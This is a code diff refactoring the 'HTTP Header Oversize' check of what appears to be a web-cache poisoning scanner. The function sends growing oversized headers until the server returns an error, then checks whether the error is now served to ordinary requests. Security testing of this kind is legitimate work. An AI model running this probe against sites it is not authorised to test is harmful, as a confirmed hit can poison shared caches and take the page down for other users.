@@ -12,60 +12,80 @@ logger = configure_logger(__name__)
 
 VULN_NAME = "HTTP Header Oversize"
 
+def HHO(url, s, main_response, authent):
+    """
+    Perform a Header Oversize Denial of Service (HHO DOS) attack on the given URL.
 
-def HHO(url, s, main_status_code, authent):
-    cpdos_win = False
-    max_i = 50
-    i = 0
+    This function attempts to detect and confirm a vulnerability by sending oversized headers
+    to the target URL and observing the response status codes. If a specific error status code
+    is detected, it indicates a potential vulnerability.
+
+    Args:
+        url (str): The target URL to test.
+        s (requests.Session): The session object to use for making requests.
+        main_response (requests.Response): The initial response from the target URL.
+        authent (tuple): Authentication credentials (username, password) for the target URL.
+
+    Returns:
+        None
+    """
+    error_detected = False
+    max_iterations = 200
+    iteration = 0
+    main_status_code = main_response.status_code
 
     big_value = "Big-Value-0"
 
-    while i < max_i:
+    while iteration < max_iterations and not error_detected:
         big_value = big_value + "0" * 50
-        h = {f"X-Oversized-Header-{i}": f"{big_value}"}
+        h = {f"X-Oversized-Header-{iteration}": f"{big_value}"}
 
         try:
-            req_hho = s.get(
+            probe = s.get(
                 url, headers=h, auth=authent, allow_redirects=False, timeout=10
             )
+
             logger.debug(
                 "STATUS (%s)\nHeaders :(%s)",
-                req_hho.status_code,
+                probe.status_code,
                 h,
             )
+
             if (
-                req_hho.status_code in [400, 413, 500, 502]
-                and req_hho.status_code != main_status_code
+                probe.status_code in [400, 413, 500, 502]
+                and probe.status_code != main_status_code
             ):
                 logger.debug(
-                    "CPDOS : URL (%s) STATUS (%s)\nHeaders :(%s)",
+                    "CPDOS : URL (%s) STATUS (%s) Headers :(%s)",
                     url,
-                    req_hho.status_code,
-                    req_hho.headers,
+                    probe.status_code,
+                    probe.headers,
                 )
-                i = 50
-                cpdos_win = True
-            i += 1
+                error_detected = True
+            iteration += 1
 
-            print(f" \033[34m {VULN_NAME} : X-Oversized-Header-{i}\033[0m\r", end="")
+            print(
+                f" \033[34m {VULN_NAME} : X-Oversized-Header-{iteration}\033[0m\r",
+                end="",
+            )
             print("\033[K", end="")
 
         except requests.exceptions.ConnectionError as e:
             logger.exception(e)
 
-    if cpdos_win:
+    if error_detected:
         try:
-            req_hho_verify = s.get(url, auth=authent, allow_redirects=False, timeout=10)
+            verify = s.get(url, auth=authent, allow_redirects=False, timeout=10)
             if (
-                req_hho_verify.status_code in [400, 413, 500, 502]
-                and req_hho_verify.status_code != main_status_code
+                verify.status_code in [400, 413, 500, 502]
+                and verify.status_code != main_status_code
             ):
-                print(
-                    f"  \033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HHO DOS: {url} | \033[34m{main_status_code} > {req_hho_verify.status_code}\033[0m | PAYLOAD: {h}"
-                )
+                reason = f"\033[34m{main_status_code} > {verify.status_code}\033[0m"
+                status = "\033[31m└── [VULNERABILITY CONFIRMED]\033[0m"
             else:
-                print(
-                    f"  \033[33m└── [INTERESTING BEHAVIOR]\033[0m | HHO DOS: {url} | \033[34m{main_status_code} > {req_hho_verify.status_code}\033[0m | PAYLOAD: {h}"
-                )
+                reason = f"\033[34m{main_status_code} > {probe.status_code}\033[0m"
+                status = "\033[33m└── [INTERESTING BEHAVIOR]\033[0m"
+            print(f" {status} | HHO DOS | {url} | {reason} | PAYLOAD: {h}")
+
         except requests.exceptions.ConnectionError as e:
             logger.exception(e)
